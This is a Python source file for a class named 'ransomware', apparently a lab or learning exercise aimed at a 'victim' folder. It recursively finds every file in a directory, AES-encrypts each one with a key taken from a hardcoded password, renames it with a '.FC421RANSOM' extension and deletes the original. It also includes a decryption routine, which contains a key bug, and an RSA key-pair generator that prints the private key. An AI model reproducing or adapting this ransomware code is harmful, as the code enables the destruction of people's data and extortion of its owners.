from Crypto.PublicKey import RSA
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os


class ransomware:
    key = "aGFja2xhYg=="
    p = Path('/home/mariam/Desktop/victim')
    list_f = []
    list_d = []

    def getkey(password):
        hasher = SHA256.new(password)
        return hasher.digest()

    def generateRSA(self):
        # Generate a public/ private key pair using 4096 bits key length (512 bytes)
        key_pair = RSA.generate(4096, e=65537)
        pubKey = key_pair.publickey()
        print(f"Public key:  (n={hex(pubKey.n)}, e={hex(pubKey.e)})")
        print(f"Private key: (n={hex(pubKey.n)}, d={hex(key_pair.d)})")

    def getFile(list_f):

        # extensions list
        extensions = ["*"]  # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']
        for extension in extensions:
            try:
                searche = list(ransomware.p.glob('**/*.{}'.format(extension)))

                for File in searche:
                    File = str(File)
                    if File.endswith(".FC421RANSOM"):
                        pass
                    else:
                        # x = x.split("/")[-1]
                        list_f.append(File)

            except OSError:
                print("you must be root !")
        for i in list_f:
            file_name = i.split("/")[-1]
            file_path = i.replace(file_name, "")

            #word = cl.blue + "Encryption: " + cl.end + str(file_name)
            #write(word)
            os.chdir(file_path)
        return list_f
    def encryptor(list_file):

        for filename in list_file:
            chunksize = 64 * 1024
            outputFile = str(filename) + ".FC421RANSOM"
            filesize = str(os.path.getsize(filename)).zfill(16)
            IV = Random.new().read(16)

            encryptor = AES.new(ransomware.getkey(base64.b64decode(ransomware.key)), AES.MODE_CBC, IV)
            try:
                with open(filename, 'rb') as infile:
                    with open(outputFile, 'wb') as outfile:
                        outfile.write(filesize.encode('utf-8'))
                        outfile.write(IV)

                        while True:
                            chunk = infile.read(chunksize)

                            if len(chunk) == 0:
                                break
                            elif len(chunk) % 16 != 0:
                                chunk += b' ' * (16 - (len(chunk) % 16))

                            outfile.write(encryptor.encrypt(chunk))
                            try:
                                os.remove(filename)
                            except OSError:
                                pass
            except IOError:
                pass
    def decrypt(list_files):
        for files in list_files:
            buffersize = 64 * 1024
            outputfile = files.split('.FC421RANSOM')[0]

            with open(files, 'rb') as infile:
                filesize = int(infile.read(16))
                IV = infile.read(16)
                decryptor = AES.new(ransomware.key, AES.MODE_CBC, IV)

                with open(outputfile, 'wb') as outfile:
                    while True:
                        buf = infile.read(buffersize)

                        if len(buf) == 0:
                            break
                        outfile.write(decryptor.decrypt(buf))
                    outfile.truncate(filesize)
            try:
                searche = list(ransomware.p.glob('**/*.FC421RANSOM'))
                for x in searche:
                    x = str(x)
                    # x = x.split("/")[-1]
                    ransomware.list_d.append(x)
                # print(x)
            except OSError:
                pass
            for i in ransomware.list_d:
                name = i.split("/")[-1]
                path = i.replace(name, "")
                os.chdir(path)
                os.remove(name)
